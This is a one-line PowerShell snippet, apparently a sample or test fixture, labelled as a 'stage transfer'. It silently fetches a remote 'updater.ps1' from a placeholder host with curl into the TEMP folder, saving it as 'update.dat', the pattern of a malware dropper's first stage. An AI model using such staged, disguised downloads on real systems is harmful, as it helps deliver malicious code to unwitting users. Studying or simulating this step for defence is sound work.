
<# Stage transfer #> $Stage1Url = 'https://example.net/updater.ps1'; $OutputPath = "$env:TEMP\update.dat"; curl.exe -s -L -o $OutputPath $Stage1Url; $StageMarker = "stage-22"
